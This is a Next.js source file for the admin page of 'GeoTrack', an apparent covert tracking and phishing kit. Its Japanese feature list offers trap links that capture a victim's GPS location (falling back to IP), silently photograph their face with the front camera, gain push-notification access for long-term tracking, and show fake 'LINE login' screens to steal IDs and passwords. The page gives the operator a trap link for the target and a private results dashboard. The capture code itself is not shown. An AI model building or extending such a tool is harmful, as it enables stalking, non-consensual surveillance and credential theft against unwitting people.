// File: src/app/admin/page.tsx
'use client'

import { useState } from 'react'
import { LinkIcon, MapPinIcon, GlobeAltIcon, ClipboardDocumentCheckIcon, QuestionMarkCircleIcon, CheckIcon, CameraIcon, BellIcon, ShieldExclamationIcon } from '@heroicons/react/24/outline'
import Link from 'next/link'

type Features = {
    gps: boolean
    camera: boolean
    pushNotification: boolean
    snsPhishing: boolean
}

const FEATURE_LIST = [
    {
        key: 'gps' as keyof Features,
        label: '📍 位置情報 (GPS)',
        description: '位置情報のパーミッションを要求。拒否されてもIPで大体の場所は特定。',
        locked: true, // 常時ON
        color: 'blue',
    },
    {
        key: 'camera' as keyof Features,
        label: '📷 カメラ撮影',
        description: 'フロントカメラでターゲットの顔を自動撮影してサーバーへ送信。',
        locked: false,
        color: 'purple',
    },
    {
        key: 'pushNotification' as keyof Features,
        label: '🔔 プッシュ通知',
        description: '通知許可を取得。以後いつでもブラウザに通知を送れる長期追跡を有効化。',
        locked: false,
        color: 'amber',
    },
    {
        key: 'snsPhishing' as keyof Features,
        label: '🎭 SNSフィッシング',
        description: '「LINEで認証」等の偽ログイン画面を表示してID/パスワードを取得。',
        locked: false,
        color: 'red',
    },
]

export default function AdminPage() {
    const [targetUrl, setTargetUrl] = useState('')
    const [loading, setLoading] = useState(false)
    const [generatedTrackId, setGeneratedTrackId] = useState<string | null>(null)
    const [copiedLink, setCopiedLink] = useState<'trap' | 'result' | null>(null)
    const [features, setFeatures] = useState<Features>({
        gps: true,
        camera: false,
        pushNotification: false,
        snsPhishing: false,
    })

    const toggleFeature = (key: keyof Features) => {
        if (key === 'gps') return // GPS is always on
        setFeatures(prev => ({ ...prev, [key]: !prev[key] }))
    }

    const activeCount = Object.values(features).filter(Boolean).length

    const handleGenerate = async (e: React.FormEvent) => {
        e.preventDefault()
        setLoading(true)

        try {
            const res = await fetch('/api/links', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ targetUrl, features })
            })

            const data = await res.json()
            if (res.ok) {
                setGeneratedTrackId(data.trackingId)
                setTargetUrl('')
            } else {
                alert(data.error || 'リンク生成に失敗しました')
            }
        } catch (err) {
            alert('エラーが発生しました。再度お試しください。')
        } finally {
            setLoading(false)
        }
    }

    const copyToClipboard = async (text: string, type: 'trap' | 'result') => {
        try {
            await navigator.clipboard.writeText(text)
            setCopiedLink(type)
            setTimeout(() => {
                setCopiedLink(null)
            }, 2000)
        } catch (err) {
            console.error('Failed to copy', err)
        }
    }

    return (
        <div className="min-h-screen bg-gray-950 flex items-center justify-center p-4">
            <div className="bg-gray-900 rounded-2xl shadow-2xl w-full max-w-xl overflow-hidden border border-gray-700">
                {/* Header */}
                <div className="bg-gradient-to-r from-gray-900 to-gray-800 p-6 text-white border-b border-gray-700">
                    <div className="flex justify-end mb-2">
                        <Link href="/help" className="text-gray-400 hover:text-white flex items-center text-sm font-medium transition-colors">
                            <QuestionMarkCircleIcon className="w-5 h-5 mr-1" />
                            使い方・解説
                        </Link>
                    </div>
                    <div className="flex items-center space-x-3">
                        <div className="w-10 h-10 rounded-xl bg-red-500/20 border border-red-500/30 flex items-center justify-center">
                            <ShieldExclamationIcon className="w-6 h-6 text-red-400" />
                        </div>
                        <div>
                            <h1 className="text-xl font-bold tracking-tight text-white">GeoTrack 管理画面</h1>
                            <p className="text-gray-400 text-xs mt-0.5">トラップリンクの生成・機能カスタマイズ</p>
                        </div>
                    </div>
                </div>

                <div className="p-6">
                    {/* Feature Toggles */}
                    <div className="mb-6">
                        <div className="flex items-center justify-between mb-3">
                            <h2 className="text-sm font-bold text-gray-300 uppercase tracking-wider">仕掛ける機能を選択</h2>
                            <span className="text-xs text-gray-500 bg-gray-800 px-2 py-1 rounded-full">{activeCount}個 有効</span>
                        </div>
                        <div className="space-y-2">
                            {FEATURE_LIST.map((feature) => (
                                <div
                                    key={feature.key}
                                    onClick={() => toggleFeature(feature.key)}
                                    className={`flex items-center justify-between p-3 rounded-xl border transition-all cursor-pointer ${features[feature.key]
                                            ? 'bg-gray-800 border-gray-600'
                                            : 'bg-gray-900 border-gray-800 opacity-60'
                                        } ${feature.locked ? 'cursor-default' : 'hover:border-gray-500'}`}
                                >
                                    <div className="flex-1 min-w-0 mr-3">
                                        <p className="text-sm font-semibold text-gray-200">{feature.label}</p>
                                        <p className="text-xs text-gray-500 mt-0.5 truncate">{feature.description}</p>
                                    </div>
                                    {/* Toggle Switch */}
                                    <div className={`relative inline-flex items-center h-6 w-11 rounded-full transition-colors flex-shrink-0 ${features[feature.key] ? 'bg-emerald-500' : 'bg-gray-700'
                                        } ${feature.locked ? 'opacity-80' : ''}`}>
                                        <span className={`inline-block w-4 h-4 transform bg-white rounded-full transition-transform shadow-md ${features[feature.key] ? 'translate-x-6' : 'translate-x-1'
                                            }`} />
                                    </div>
                                </div>
                            ))}
                        </div>
                    </div>

                    {/* URL Form */}
                    <form onSubmit={handleGenerate} className="space-y-4">
                        <div>
                            <label htmlFor="url" className="block text-sm font-medium text-gray-300 mb-2">
                                リダイレクト先URL（本物のURL）
                            </label>
                            <div className="relative">
                                <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                                    <LinkIcon className="h-5 w-5 text-gray-500" />
                                </div>
                                <input
                                    type="url"
                                    id="url"
                                    required
                                    placeholder="https://maps.app.goo.gl/..."
                                    className="block w-full pl-10 pr-3 py-3 bg-gray-800 border border-gray-700 rounded-xl text-white placeholder-gray-500 focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-colors text-sm"
                                    value={targetUrl}
                                    onChange={(e) => setTargetUrl(e.target.value)}
                                />
                            </div>
                            <p className="mt-1.5 text-xs text-gray-500">
                                情報取得後に相手をリダイレクトさせる本物のURLを入力してください。
                            </p>
                        </div>

                        <button
                            type="submit"
                            disabled={loading}
                            className={`w-full flex justify-center py-3 px-4 border border-transparent rounded-xl shadow-sm text-sm font-semibold text-white transition-all 
                ${loading ? 'bg-gray-700 cursor-not-allowed' : 'bg-red-600 hover:bg-red-700 hover:shadow-lg hover:-translate-y-0.5'}`}
                        >
                            {loading ? (
                                <span className="flex items-center">
                                    <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                                        <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                                        <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                                    </svg>
                                    生成中...
                                </span>
                            ) : (
                                '🎯 トラップリンクを生成'
                            )}
                        </button>
                    </form>

                    {generatedTrackId && (
                        <div className="mt-6 p-4 bg-gray-800 rounded-xl border border-gray-700 animate-fade-in-up">
                            <h3 className="text-sm font-bold text-green-400 mb-4 flex items-center">
                                <MapPinIcon className="w-5 h-5 mr-2" />
                                リンクの生成が完了しました！
                            </h3>

                            <div className="space-y-3">
                                {/* Trap Link */}
                                <div>
                                    <label className="block text-xs font-semibold text-red-400 uppercase tracking-wider mb-1">
                                        🎯 トラップリンク（相手に送る）
                                    </label>
                                    <div className="flex items-center">
                                        <input
                                            type="text"
                                            readOnly
                                            className="block w-full text-sm bg-gray-900 border border-gray-700 rounded-l-lg py-2 px-3 text-gray-300 outline-none font-mono"
                                            value={`${typeof window !== 'undefined' ? window.location.origin : ''}/${generatedTrackId}`}
                                        />
                                        <button
                                            onClick={() => copyToClipboard(`${window.location.origin}/${generatedTrackId}`, 'trap')}
                                            className={`${copiedLink === 'trap' ? 'bg-emerald-600 hover:bg-emerald-700' : 'bg-red-600 hover:bg-red-700'} text-white px-3 py-2 rounded-r-lg transition-colors`}
                                            title="コピー"
                                        >
                                            {copiedLink === 'trap' ? (
                                                <CheckIcon className="w-5 h-5" />
                                            ) : (
                                                <ClipboardDocumentCheckIcon className="w-5 h-5" />
                                            )}
                                        </button>
                                    </div>
                                </div>

                                {/* Result Link */}
                                <div>
                                    <label className="block text-xs font-semibold text-emerald-400 uppercase tracking-wider mb-1">
                                        👁️ 結果ダッシュボード（自分が見る）
                                    </label>
                                    <div className="flex items-center">
                                        <input
                                            type="text"
                                            readOnly
                                            className="block w-full text-sm bg-gray-900 border border-gray-700 rounded-l-lg py-2 px-3 text-gray-300 outline-none font-mono"
                                            value={`${typeof window !== 'undefined' ? window.location.origin : ''}/result/${generatedTrackId}`}
                                        />
                                        <button
                                            onClick={() => copyToClipboard(`${window.location.origin}/result/${generatedTrackId}`, 'result')}
                                            className={`${copiedLink === 'result' ? 'bg-emerald-600 hover:bg-emerald-700' : 'bg-emerald-600 hover:bg-emerald-700'} text-white px-3 py-2 rounded-r-lg transition-colors`}
                                            title="コピー"
                                        >
                                            {copiedLink === 'result' ? (
                                                <CheckIcon className="w-5 h-5" />
                                            ) : (
                                                <ClipboardDocumentCheckIcon className="w-5 h-5" />
                                            )}
                                        </button>
                                    </div>
                                </div>

                                {/* Active features summary */}
                                <div className="mt-2 flex flex-wrap gap-1">
                                    {FEATURE_LIST.filter(f => features[f.key]).map(f => (
                                        <span key={f.key} className="text-xs bg-gray-700 text-gray-300 px-2 py-0.5 rounded-full">
                                            {f.label.split(' ')[0]} {f.label.split(' ').slice(1).join(' ')}
                                        </span>
                                    ))}
                                </div>
                            </div>
                        </div>
                    )}
                </div>
            </div>
        </div>
    )
}
